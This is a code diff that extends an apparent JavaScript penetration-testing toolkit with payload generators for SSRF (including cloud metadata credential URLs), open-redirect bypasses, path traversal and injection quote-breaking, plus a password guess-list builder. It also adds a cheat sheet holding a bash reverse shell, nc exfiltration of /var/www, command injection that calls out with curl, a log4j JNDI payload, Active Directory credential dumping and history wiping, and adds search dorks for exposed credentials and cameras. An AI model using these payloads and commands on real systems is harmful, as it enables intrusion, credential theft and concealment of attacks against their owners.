@@ -247,6 +247,525 @@
     { k: 'redirect', s: 'https:evil.example' }
   ];
 
+/* ---------- 8. cidr ---------------------------------------------------- */
+function ipToInt(ip) {
+  const p = String(ip).trim().split('.');
+  if (p.length !== 4) throw new Error('need 4 dotted octets, got ' + p.length);
+  let n = 0;
+  for (const o of p) {
+    if (!/^\d{1,3}$/.test(o)) throw new Error('bad octet "' + o + '"');
+    const v = parseInt(o, 10);
+    if (v > 255) throw new Error('octet out of range: ' + o);
+    n = n * 256 + v;
+  }
+  return n >>> 0;
+}
+function intToIp(n) {
+  n = n >>> 0;
+  return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.');
+}
+function commas(n) {
+  return String(n).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+}
+function pad12(s) {
+  return String(s).padEnd(12);
+}
+
+function cidrCalc(v) {
+  const raw = need(v, 'cidr', 'cidr').replace(/\s+/g, '');
+  const parts = raw.split('/');
+  const bits = (parts.length > 1 && parts[1] !== '') ? parseInt(parts[1], 10) : 32;
+  if (!(bits >= 0 && bits <= 32)) throw new Error('prefix must be 0-32, got "' + parts[1] + '"');
+  const addr = ipToInt(parts[0]);
+  const maskN = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
+  const net = (addr & maskN) >>> 0;
+  const bc = (net | ((~maskN) >>> 0)) >>> 0;
+  const total = Math.pow(2, 32 - bits);
+  let hosts, first, last;
+  if (bits === 32) { hosts = 1; first = net; last = bc; }
+  else if (bits === 31) { hosts = 2; first = net; last = bc; }
+  else { hosts = total - 2; first = (net + 1) >>> 0; last = (bc - 1) >>> 0; }
+
+  const L = [];
+  L.push(pad12('network') + intToIp(net) + '/' + bits);
+  L.push(pad12('address') + intToIp(addr) + (net !== addr ? '   ! input host bits set' : ''));
+  L.push(pad12('mask') + intToIp(maskN) + '  (/' + bits + ')');
+  L.push(pad12('wildcard') + intToIp((~maskN) >>> 0));
+  L.push(pad12('broadcast') + (bits >= 31 ? '(none - point-to-point)' : intToIp(bc)));
+  L.push(pad12('first host') + intToIp(first));
+  L.push(pad12('last host') + intToIp(last));
+  L.push(pad12('addresses') + commas(total));
+  L.push(pad12('hosts') + commas(hosts));
+
+  if (addr === 0xa9fea9fe || net === 0xa9fea9fe) {
+    L.push(pad12('flag') + 'CLOUD METADATA endpoint - instance credentials live here');
+  } else if ((net >>> 16) === 0xa9fe) {
+    L.push(pad12('flag') + 'link-local 169.254.0.0/16 - APIPA / metadata range');
+  }
+  if (bits === 0) L.push(pad12('flag') + '0.0.0.0/0 - the whole internet, be sure you mean it');
+
+  let note = intToIp(net) + '/' + bits + ' - ' + commas(hosts) + ' usable host' + (hosts === 1 ? '' : 's');
+
+  const splitTo = String(v.split || '').trim().replace('/', '');
+  if (splitTo) {
+    const sb = parseInt(splitTo, 10);
+    if (!(sb > bits && sb <= 32)) throw new Error('split must be a bigger prefix than /' + bits + ' and <= 32');
+    const count = Math.pow(2, sb - bits);
+    if (count > 256) throw new Error('split makes ' + count + ' subnets - cap is 256');
+    const step = Math.pow(2, 32 - sb);
+    L.push('');
+    L.push(count + ' x /' + sb);
+    for (let i = 0; i < count; i++) L.push('  ' + intToIp((net + i * step) >>> 0) + '/' + sb);
+    note += ' - split into ' + count + ' x /' + sb;
+  }
+  return { text: L.join('\n'), note };
+}
+
+/* ---------- 9. ipv6 ---------------------------------------------------- */
+function v6parse(s) {
+  let t = String(s).trim().toLowerCase();
+  if (!t) throw new Error('empty address');
+  t = t.replace(/^\[/, '').replace(/\]$/, '').replace(/%.*$/, '');
+  if (t.includes('.')) {
+    const i = t.lastIndexOf(':');
+    const v4 = ipToInt(t.slice(i + 1));
+    t = t.slice(0, i + 1) + ((v4 >>> 16) & 0xffff).toString(16) + ':' + (v4 & 0xffff).toString(16);
+  }
+  let groups;
+  const dbl = t.indexOf('::');
+  if (dbl >= 0) {
+    if (t.indexOf('::', dbl + 1) >= 0) throw new Error('more than one "::" in the address');
+    const h = t.slice(0, dbl), tl = t.slice(dbl + 2);
+    const head = h ? h.split(':') : [];
+    const tail = tl ? tl.split(':') : [];
+    const fill = 8 - head.length - tail.length;
+    if (fill < 0) throw new Error('too many groups for 128 bits');
+    groups = head.concat(new Array(fill).fill('0'), tail);
+  } else {
+    groups = t.split(':');
+  }
+  if (groups.length !== 8) throw new Error('expected 8 groups, got ' + groups.length);
+  return groups.map(g => {
+    if (!/^[0-9a-f]{1,4}$/.test(g)) throw new Error('bad group "' + g + '"');
+    return parseInt(g, 16);
+  });
+}
+function v6compress(g) {
+  let bi = -1, bl = 0, i = 0;
+  while (i < 8) {
+    if (g[i] === 0) {
+      let j = i;
+      while (j < 8 && g[j] === 0) j++;
+      if (j - i > bl) { bl = j - i; bi = i; }
+      i = j;
+    } else i++;
+  }
+  const hx = g.map(x => x.toString(16));
+  if (bl < 2) return hx.join(':');
+  return hx.slice(0, bi).join(':') + '::' + hx.slice(bi + bl).join(':');
+}
+function v6bracketed(g) {
+  return '[' + v6compress(g) + ']';
+}
+function v6v4(g) {
+  return intToIp(((g[6] << 16) | g[7]) >>> 0);
+}
+function v6decimal(g) {
+  let n = 0n;
+  for (const x of g) n = (n << 16n) | BigInt(x);
+  return n.toString(10);
+}
+function v6Calc(v) {
+  const g = v6parse(need(v, 'addr', 'address'));
+  const L = [];
+  L.push(pad12('expanded') + g.map(x => x.toString(16).padStart(4, '0')).join(':'));
+  L.push(pad12('compressed') + v6compress(g));
+  L.push(pad12('upper') + v6compress(g).toUpperCase());
+  L.push(pad12('bracketed') + v6compress(g).replace(/^\[|\]$/g, ''));
+  L.push(pad12('url host') + v6bracketed(g));
+  L.push(pad12('v4-mapped') + '[' + '::ffff:' + v6v4(g) + ']');
+  L.push(pad12('decimal') + v6decimal(g));
+  const loop = g.slice(0, 7).every(x => x === 0) && g[7] === 1;
+  if (loop) L.push(pad12('note') + 'loopback - the v6 way of saying 127.0.0.1');
+  const isMapped = g.slice(0, 5).every(x => x === 0) && g[5] === 0xffff;
+  if (isMapped) L.push(pad12('note') + 'v4-mapped - filters often forget this shape');
+  return { text: L.join('\n'), note: v6compress(g) + ' - ' + (isMapped ? 'v4-mapped form' : 'native v6') };
+}
+function v6Variants(v) {
+  const g = v6parse(need(v, 'addr', 'address'));
+  const c = v6compress(g);
+  const full = g.map(x => x.toString(16).padStart(4, '0')).join(':');
+  const v4 = v6v4(g);
+  const L = [];
+  L.push(pad12('compressed') + '[' + c + ']');
+  L.push(pad12('expanded') + '[' + full + ']');
+  L.push(pad12('upper') + '[' + c.toUpperCase() + ']');
+  L.push(pad12('padded-last') + '[' + c.replace(/:([0-9a-f]{1,3})$/, ':000$1') + ']');
+  L.push(pad12('v4-mapped') + '[::ffff:' + v4 + ']');
+  L.push(pad12('v4-as-hex') + '[::ffff:' + g[6].toString(16) + ':' + g[7].toString(16) + ']');
+  L.push(pad12('v4-mapped-ls') + '[0:0:0:0:0:ffff:' + v4 + ']');
+  L.push(pad12('zone-id') + '[::1%25]');
+  L.push(pad12('bare') + '[' + c + ']:80');
+  L.push(pad12('url') + 'http://[' + c + ']:80/');
+  L.push(pad12('url-mapped') + 'http://[::ffff:' + v4 + ']:80/');
+  L.push(pad12('url-long') + 'http://[' + full + ']:80/');
+  return { text: L.join('\n'), note: '12 v6 shapes - same host, different strings' };
+}
+
+/* ---------- 10. loose v4 + ssrf --------------------------------------- */
+function parseLooseV4(s) {
+  let t = String(s).trim().toLowerCase()
+    .replace(/^[a-z]+:\/\//, '')
+    .split(/[/?#]/)[0]
+    .replace(/:\d+$/, '');
+  if (!t) throw new Error('empty host');
+  const parts = t.split('.');
+  if (parts.length > 4) throw new Error('more than 4 parts - not an IPv4 shape');
+  const nums = parts.map(p => {
+    if (p === '') throw new Error('empty part - "1..2" is not an address');
+    if (/^0x[0-9a-f]+$/.test(p)) return parseInt(p.slice(2), 16);
+    if (/^0[0-7]+$/.test(p)) return parseInt(p.slice(1), 8);
+    if (/^\d+$/.test(p)) return parseInt(p, 10);
+    throw new Error('part "' + p + '" is not a number - this only reads numeric IPv4 shapes');
+  });
+  const last = nums.pop();
+  const rest = 4 - nums.length;
+  if (nums.some(n => n > 255)) throw new Error('octet out of range');
+  if (last >= Math.pow(256, rest)) throw new Error('last part does not fit the remaining ' + rest + ' byte(s)');
+  let n = 0;
+  for (const x of nums) n = n * 256 + x;
+  n = n * Math.pow(256, rest) + last;
+  return n >>> 0;
+}
+function octalForm(n) {
+  const b = [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+  return b.map(x => '0' + x.toString(8)).join('.');
+}
+function ssrfMatrix(v) {
+  const host = need(v, 'host', 'host');
+  const port = String(v.port || '80').trim() || '80';
+  const scheme = String(v.scheme || 'http').trim() || 'http';
+  const L = [];
+  L.push('HOST ENCODINGS');
+  let n = null;
+  try { n = parseLooseV4(host); } catch (e) { n = null; }
+  if (n === null) {
+    L.push(pad12('as-given') + host);
+    L.push(pad12('note') + 'not a numeric IPv4 - hostname rows only');
+    L.push('');
+    L.push('URL FORMS');
+    L.push(scheme + '://' + host + ':' + port + '/');
+    L.push(scheme + '://' + host + ':' + port + '/?@127.0.0.1/');
+    L.push('http://127.0.0.1:' + port + '/');
+    L.push('http://169.254.169.254/latest/meta-data/');
+    return { text: L.join('\n'), note: host + ' - ' + L.length + ' rows, hostname shapes only' };
+  }
+  const b = [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
+  L.push(pad12('dotted') + intToIp(n));
+  L.push(pad12('decimal') + String(n));
+  L.push(pad12('hex') + '0x' + n.toString(16));
+  L.push(pad12('octal') + octalForm(n));
+  L.push(pad12('short') + b[0] + '.' + ((n >>> 0) & 0xffffff));
+  L.push(pad12('two-part') + b[0] + '.' + (((b[1] << 16) | (b[2] << 8) | b[3]) >>> 0));
+  L.push(pad12('three-part') + b[0] + '.' + b[1] + '.' + (((b[2] << 8) | b[3]) >>> 0));
+  L.push(pad12('zero-padded') + b.map(x => String(x).padStart(3, '0')).join('.'));
+  L.push(pad12('mixed base') + '0x' + b[0].toString(16) + '.0' + b[1].toString(8) + '.' + b[2] + '.' + b[3]);
+  L.push(pad12('v4-mapped') + '[::ffff:' + intToIp(n) + ']');
+  L.push(pad12('v6-hex') + '[::ffff:' + b[2].toString(16) + ':' + b[3].toString(16) + ']');
+  L.push(pad12('v6-long') + '[0:0:0:0:0:ffff:' + ((b[2] << 8) | b[3]).toString(16) + ']');
+  L.push(pad12('zero-host') + '0.0.0.0');
+  L.push('');
+  L.push('URL FORMS');
+  L.push(scheme + '://' + intToIp(n) + ':' + port + '/');
+  L.push(scheme + '://' + n + ':' + port + '/');
+  L.push(scheme + '://0x' + n.toString(16) + ':' + port + '/');
+  L.push(scheme + '://' + octalForm(n) + ':' + port + '/');
+  L.push(scheme + '://' + b[0] + '.' + ((n >>> 0) & 0xffffff) + ':' + port + '/');
+  L.push(scheme + '://[::ffff:' + intToIp(n) + ']:' + port + '/');
+  L.push('gopher://' + intToIp(n) + ':' + port + '/_GET / HTTP/1.1');
+  L.push('dict://' + intToIp(n) + ':' + port + '/STAT');
+  L.push('');
+  L.push('DNS + CLOUD');
+  L.push('http://localtest.me:' + port + '/      (resolves to 127.0.0.1)');
+  L.push('http://' + intToIp(n) + '.nip.io:' + port + '/');
+  L.push('http://127.0.0.1.sslip.io:' + port + '/');
+  L.push('http://<your-rebind-domain>:' + port + '/   (you control the A record)');
+  L.push('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
+  L.push('http://metadata.google.internal/computeMetadata/v1/');
+  L.push('http://169.254.169.254/metadata/instance?api-version=2021-02-01');
+  return { text: L.join('\n'), note: host + ' - ' + (L.length) + ' rows, one meaning' };
+}
+
+/* ---------- 11. redirect ----------------------------------------------- */
+function redirectVariants(v) {
+  const evil = need(v, 'evil', 'host').replace(/^[a-z]+:\/\//, '');
+  const good = 'target.example';
+  const L = [
+    ['protocol-rel', '//' + evil],
+    ['no-slash', 'https:' + evil],
+    ['one-slash', 'https:/' + evil],
+    ['triple-slash', '///' + evil],
+    ['at-userinfo', 'https://' + good + '@' + evil],
+    ['slash-backslash', '/\\' + evil],
+    ['backslash-slash', '\\/' + evil],
+    ['double-backslash', '\\\\' + evil],
+    ['tab-split', '/%09/' + evil],
+    ['crlf', '/' + evil + '%0d%0aLocation:%20//' + evil],
+    ['dot-segment', '//' + evil + '/%2f..'],
+    ['encoded-slash', '/%2f%2e' + evil],
+    ['fragment-at', '//' + evil + '#@' + good],
+    ['full-url-at', 'https://' + evil + '\\@' + good],
+    ['unicode-dot', '//' + evil.replace(/\./g, '\u3002')]
+  ];
+  return {
+    text: L.map(r => r[0].padEnd(16) + r[1]).join('\n'),
+    note: evil + ' - 15 shapes, all pointing one way'
+  };
+}
+
+/* ---------- 12. traversal ---------------------------------------------- */
+function traversalSpray(v) {
+  const path = need(v, 'path', 'path');
+  const prefix = String(v.prefix || '').trim();
+  const clean = path.replace(/^\/+/, '');
+  const L = [];
+  for (let d = 1; d <= 10; d++) L.push(['depth ' + d, prefix + '../'.repeat(d) + clean]);
+  L.push(['double-url', prefix + '..%252f'.repeat(5) + clean]);
+  L.push(['overlong utf8', prefix + '..%c0%af'.repeat(5) + clean]);
+  L.push(['unicode sep', prefix + '..%c1%9c'.repeat(5) + clean]);
+  L.push(['filter evade', prefix + '....//'.repeat(5) + clean]);
+  L.push(['backslash', prefix + '..\\'.repeat(5) + clean]);
+  L.push(['null byte', prefix + '../'.repeat(5) + clean + '%00.png']);
+  L.push(['absolute', prefix + path]);
+  return {
+    text: L.map(r => r[0].padEnd(16) + r[1]).join('\n'),
+    note: '17 rows for ' + path + ' - depth 10 is plenty for most roots'
+  };
+}
+
+/* ---------- 13. quotes ------------------------------------------------- */
+// encodeURIComponent leaves ' unescaped - useless for a quote breaker.
+function pctEncode(s) {
+  let out = '';
+  for (const b of TE.encode(String(s))) {
+    const c = String.fromCharCode(b);
+    out += /[A-Za-z0-9\-_.~]/.test(c) ? c : '%' + b.toString(16).toUpperCase().padStart(2, '0');
+  }
+  return out;
+}
+function quoteBreak(v) {
+  const s = need(v, 'str', 'string');
+  const bytes = Array.from(TE.encode(s));
+  const L = [
+    ['SQL single', s.replace(/'/g, "''")],
+    ['SQL double', s.replace(/'/g, '"')],
+    ['SQL hex', '0x' + hexFrom(s)],
+    ['SQL CHAR()', 'CHAR(' + bytes.join(',') + ')'],
+    ['SQL concat', bytes.map(x => 'CHAR(' + x + ')').join('||')],
+    ['no quotes', s.replace(/['"]/g, '')],
+    ['backslash', s.replace(/'/g, "\\'")],
+    ['shell $()', '$(printf ' + JSON.stringify(s) + ')'],
+    ['shell backtick', '`printf ' + JSON.stringify(s) + '`'],
+    ['JS escape', JSON.stringify(s)],
+    ['JS template', '${' + JSON.stringify(s) + '}'],
+    ['URL', pctEncode(s)],
+    ['URL double', pctEncode(pctEncode(s))]
+  ];
+  return {
+    text: L.map(r => r[0].padEnd(16) + r[1]).join('\n'),
+    note: s.length + ' chars - ' + L.length + ' ways to say the same thing'
+  };
+}
+
+/* ---------- 14. wordlist ---------------------------------------------- */
+function wordMix(v) {
+  const name = need(v, 'name', 'name').trim();
+  const year = String(v.year || '').trim() || String(new Date().getFullYear());
+  const extras = String(v.extras || '').split(',').map(s => s.trim()).filter(Boolean);
+  const low = name.toLowerCase();
+  const cap = low.charAt(0).toUpperCase() + low.slice(1);
+  const up = name.toUpperCase();
+  const leet = low.replace(/a/g, '4').replace(/e/g, '3').replace(/i/g, '1')
+    .replace(/o/g, '0').replace(/s/g, '5').replace(/t/g, '7');
+  const raw = [
+    ['base', low],
+    ['capitalized', cap],
+    ['upper', up],
+    ['as typed', name],
+    ['+year', low + year],
+    ['year+', year + low],
+    ['+!', low + '!'],
+    ['+!1', low + '!1'],
+    ['Cap!1', cap + '!1'],
+    ['Cap+year!', cap + year + '!'],
+    ['+year!1', low + year + '!1'],
+    ['leet', leet],
+    ['leet+year', leet + year],
+    ['leet Cap', leet.charAt(0).toUpperCase() + leet.slice(1) + '!']
+  ];
+  for (const x of extras) {
+    raw.push([x + '+name', x.charAt(0).toUpperCase() + x.slice(1) + cap]);
+    raw.push(['name+' + x, cap + x.charAt(0).toUpperCase() + x.slice(1)]);
+  }
+  const seen = {};
+  const rows = [];
+  for (const r of raw) {
+    if (!r[1] || seen[r[1]]) continue;
+    seen[r[1]] = 1;
+    rows.push(r);
+  }
+  return {
+    text: rows.map(r => r[0].padEnd(12) + r[1]).join('\n'),
+    count: rows.length,
+    note: rows.length + ' candidates for "' + name + '" - a guess list, not a crack'
+  };
+}
+
+/* ---------- 15. cheat sheets ------------------------------------------ */
+const HAT_NAMES = { w: 'white', g: 'grey', b: 'black', c: 'common' };
+const CHEATS = [
+  ['w', 'whois', 'whois example.com | grep -iE "registrar|created"'],
+  ['w', 'dns', 'dig +short A example.com; dig +short MX example.com'],
+  ['w', 'zone xfer', 'dig axfr @ns1.example.com example.com'],
+  ['w', 'crt.sh', 'curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r ".[].name_value" | sort -u'],
+  ['w', 'subs', 'curl -s "https://api.hackertarget.com/hostsearch/?q=example.com"'],
+  ['w', 'robots', 'curl -s https://example.com/robots.txt'],
+  ['w', 'sitemap', 'curl -s https://example.com/sitemap.xml | head -50'],
+  ['w', 'headers', 'curl -sI https://example.com'],
+  ['w', 'fingerprint', 'whatweb -a 3 https://example.com'],
+  ['w', 'tech', 'curl -s https://example.com | grep -oiE "(wordpress|drupal|nginx|apache|iis)" | sort -u'],
+  ['w', 'osint', 'theHarvester -d example.com -b duckduckgo'],
+  ['w', 'google', 'site:example.com -inurl:www filetype:pdf'],
+  ['w', 'wayback', 'curl -s "http://archive.org/wayback/available?url=example.com"'],
+  ['w', 'dnsrecon', 'dnsrecon -d example.com -t std'],
+  ['g', 'nmap', 'nmap -sT -Pn -T4 --top-ports 1000 10.0.0.5'],
+  ['g', 'nmap ver', 'nmap -sV -sC -p 22,80,443 10.0.0.5'],
+  ['g', 'httpx', 'httpx -l hosts.txt -title -tech-detect -status-code'],
+  ['g', 'ffuf', 'ffuf -u https://t/FUZZ -w common.txt -mc 200,204,301,302,401,403'],
+  ['g', 'gobuster', 'gobuster dir -u https://t -w common.txt -x php,html,txt'],
+  ['g', 'nikto', 'nikto -h https://t -ssl -maxtime 120s'],
+  ['g', 'nuclei', 'nuclei -u https://t -severity low,medium,high,critical'],
+  ['g', 'tls', 'testssl.sh --quiet https://t'],
+  ['g', 'vhost', 'ffuf -u http://t -H "Host: FUZZ.example.com" -w subs.txt -fs 0'],
+  ['b', 'smbmap', "smbmap -H 10.0.0.5 -u guest -p ''"],
+  ['b', 'smbclient', 'smbclient -L //10.0.0.5 -N'],
+  ['b', 'ldap', 'ldapsearch -x -H ldap://10.0.0.5 -b "dc=corp,dc=local"'],
+  ['b', 'kerberoast', 'impacket-GetUserSPNs corp.local/u:p -dc-ip 10.0.0.5 -request'],
+  ['b', 'asrep', 'impacket-GetNPUsers corp.local/ -dc-ip 10.0.0.5 -no-pass -usersfile u.txt'],
+  ['b', 'secretsdump', 'impacket-secretsdump corp.local/u:p@10.0.0.5'],
+  ['b', 'psexec', 'impacket-psexec corp.local/u:p@10.0.0.5'],
+  ['b', 'winrm', 'evil-winrm -i 10.0.0.5 -u u -p p'],
+  ['b', 'redis', 'redis-cli -h 10.0.0.5 -p 6379 info; redis-cli -h 10.0.0.5 config get dir'],
+  ['b', 'mongodb', 'mongosh "mongodb://10.0.0.5:27017" --eval "db.adminCommand({listDatabases:1})"'],
+  ['b', 'mysql', "mysql -h 10.0.0.5 -u root -e 'show databases;'"],
+  ['b', 'mssql', 'impacket-mssqlclient corp.local/u:p@10.0.0.5 -windows-auth'],
+  ['b', 'nfs', 'showmount -e 10.0.0.5 && mount -t nfs 10.0.0.5:/export /mnt/nfs'],
+  ['b', 'docker', 'curl -s http://10.0.0.5:2375/version'],
+  ['b', 'linpeas', './linpeas.sh -a | tee pea.txt'],
+  ['b', 'sudo', 'sudo -l; find / -perm -4000 -type f 2>/dev/null'],
+  ['b', 'unshadow', 'unshadow /etc/passwd /etc/shadow > h.txt && john h.txt'],
+  ['b', 'pivot ssh', 'ssh -D 1080 -N -f user@10.0.0.5'],
+  ['b', 'chisel', './chisel client 10.0.0.1:8000 R:socks'],
+  ['b', 'exfil', 'tar czf - /var/www | nc 10.0.0.1 9001'],
+  ['b', 'cleanup', 'history -c; rm -f ~/.bash_history'],
+  ['c', 'listener', 'nc -lvnp 4444'],
+  ['c', 'revshell', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'],
+  ['c', 'sqlmap', 'sqlmap -u "https://t/?id=1" --batch --dbs'],
+  ['c', 'lfi', 'curl -s "https://t/?f=../../../../etc/passwd"'],
+  ['c', 'xss', '<svg/onload=alert(document.domain)>'],
+  ['c', 'cmdi', ';id;curl http://10.0.0.1/$(whoami)'],
+  ['c', 'ssrf', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
+  ['c', 'ssti', '{{7*7}}${7*7}<%=7*7%>'],
+  ['c', 'jwt', 'python3 jwt_tool.py TOKEN -M at'],
+  ['c', 'hashcat', 'hashcat -m 1800 -a 0 hash.txt rockyou.txt'],
+  ['c', 'john', 'john --wordlist=rockyou.txt hash.txt'],
+  ['c', 'tcpdump', 'tcpdump -i eth0 -nn -A port 80'],
+  ['c', 'curl post', 'curl -s -X POST https://t/api -H "Content-Type: application/json" -d "{\\"a\\":1}"'],
+  ['c', 'log4j', '${jndi:ldap://10.0.0.1:1389/a}'],
+  ['c', 'open redir', 'https://t/r?u=//evil.example'],
+  ['c', 'git', 'curl -s https://t/.git/HEAD'],
+  ['c', 'port scan', 'for p in 21 22 80 443 445 3389; do nc -z -w1 10.0.0.5 $p && echo "$p open"; done'],
+  ['c', 'aws meta', 'curl -s http://169.254.169.254/latest/meta-data/']
+];
+function cheatLook(v) {
+  const q = String(v.q || '').toLowerCase().trim();
+  const rows = CHEATS.filter(c => {
+    if (!q) return true;
+    const hat = HAT_NAMES[c[0]] || c[0];
+    if (hat === q || (q.length === 1 && c[0] === q)) return true;
+    return hat.includes(q) || c[1].toLowerCase().includes(q) || c[2].toLowerCase().includes(q);
+  });
+  return {
+    text: rows.map(c => (HAT_NAMES[c[0]] || c[0]).padEnd(7) + c[1].padEnd(13) + c[2]).join('\n') || '(nothing matched)',
+    note: rows.length + ' of ' + CHEATS.length + ' - white / grey / black, every row assumes written permission'
+  };
+}
+
+/* ---------- 16. dorks ------------------------------------------------- */
+const DORK_CATS = ['creds', 'files', 'dirs', 'cams', 'cloud', 'errors', 'info'];
+const DORKS = [
+  ['creds', 'filetype:xls inurl:password'],
+  ['creds', 'filetype:env "DB_PASSWORD"'],
+  ['creds', 'inurl:wp-config.php.bak'],
+  ['creds', 'intitle:"index of" ".htpasswd"'],
+  ['creds', 'filetype:log inurl:password'],
+  ['creds', 'inurl:"/wp-content/debug.log"'],
+  ['creds', 'ext:sql inurl:database'],
+  ['creds', 'intext:"BEGIN RSA PRIVATE KEY"'],
+  ['files', 'filetype:pdf site:example.com'],
+  ['files', 'intitle:"index of" filetype:sql'],
+  ['files', 'filetype:bak inurl:backup'],
+  ['files', 'filetype:csv intext:email,password'],
+  ['files', 'intitle:"index of" passwd'],
+  ['files', 'filetype:ini "password"'],
+  ['files', 'inurl:.git/config'],
+  ['files', 'filetype:ovpn'],
+  ['dirs', 'intitle:"index of /admin"'],
+  ['dirs', 'intitle:"index of /backup"'],
+  ['dirs', 'inurl:/uploads/ filetype:php'],
+  ['dirs', 'intitle:"index of" "Parent Directory"'],
+  ['dirs', 'inurl:/phpinfo.php'],
+  ['dirs', 'intitle:"Dashboard" inurl:admin'],
+  ['dirs', 'inurl:.svn/entries'],
+  ['cams', 'inurl:"/view/index.shtml"'],
+  ['cams', 'intitle:"Live View / - AXIS"'],
+  ['cams', 'inurl:8080 intitle:"webcamxp"'],
+  ['cams', 'intitle:"Network Camera" inurl:viewer'],
+  ['cams', 'inurl:"/cgi-bin/CGIProxy.fcgi"'],
+  ['cloud', 'site:amazonaws.com "index of"'],
+  ['cloud', 'site:blob.core.windows.net'],
+  ['cloud', 'site:storage.googleapis.com'],
+  ['cloud', 'site:digitaloceanspaces.com'],
+  ['errors', '"Warning: mysql_connect()" intext:password'],
+  ['errors', '"PHP Parse error" inurl:.php'],
+  ['errors', '"ORA-00933" OR "ORA-01756"'],
+  ['errors', '"Microsoft OLE DB Provider for SQL Server" intext:error'],
+  ['errors', '"Stack trace:" "at java."'],
+  ['errors', 'intext:"Traceback (most recent call last)"'],
+  ['errors', '"SQL syntax.*MySQL" intext:warning'],
+  ['info', 'site:example.com -inurl:www'],
+  ['info', 'inurl:employee site:example.com'],
+  ['info', '"internal use only" filetype:pdf'],
+  ['info', 'inurl:dashboard intitle:"login"'],
+  ['info', 'inurl:/api/v1/ intext:swagger'],
+  ['info', 'intitle:"Swagger UI"'],
+  ['info', 'inurl:"/.well-known/security.txt"'],
+  ['info', 'site:pastebin.com "example.com"']
+];
+function dorksLook(v) {
+  const q = String(v.q || '').toLowerCase().trim();
+  const cat = String(v.cat || '').toLowerCase().trim();
+  const rows = DORKS.filter(d => {
+    if (cat && d[0] !== cat) return false;
+    if (!q) return true;
+    return d[0].includes(q) || d[1].toLowerCase().includes(q);
+  });
+  return {
+    text: rows.map(d => d[0].padEnd(8) + d[1]).join('\n') || '(nothing matched)',
+    note: rows.length + ' of ' + DORKS.length + ' - recon reference, obey your scope'
+  };
+}
+
   /* ---------- dispatcher ------------------------------------------------- */
   TK.run = function (tool, act, vals) {
     vals = vals || {};
@@ -299,6 +818,42 @@
             note: `${rows.length} payloads — lab targets only`
           };
         }
+        case 'cidr': {
+          const r = cidrCalc(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'ipv6': {
+          const r = (act === 'variants') ? v6Variants(vals) : v6Calc(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'ssrf': {
+          const r = ssrfMatrix(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'redirect': {
+          const r = redirectVariants(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'traversal': {
+          const r = traversalSpray(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'quotes': {
+          const r = quoteBreak(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'wordmix': {
+          const r = wordMix(vals);
+          return { out: { result: r.text, count: String(r.count) }, note: r.note };
+        }
+        case 'cheat': {
+          const r = cheatLook(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
+        case 'dorks': {
+          const r = dorksLook(vals);
+          return { out: { result: r.text }, note: r.note };
+        }
         default:
           throw new Error('unknown tool ' + tool);
       }
@@ -307,6 +862,9 @@
     }
   };
 
-  TK._internals = { b64e, b64d, b64urlDec, hashId, jwtDecode, nmapBuild, revshell, tsFmt };
+  TK._internals = { b64e, b64d, b64urlDec, hashId, jwtDecode, nmapBuild, revshell, tsFmt,
+                   ipToInt, intToIp, cidrCalc, v6parse, v6compress, parseLooseV4,
+                   ssrfMatrix, redirectVariants, traversalSpray, quoteBreak, wordMix,
+                   cheatLook, dorksLook, CHEATS, DORKS };
   root.TK = TK;
 })(window);
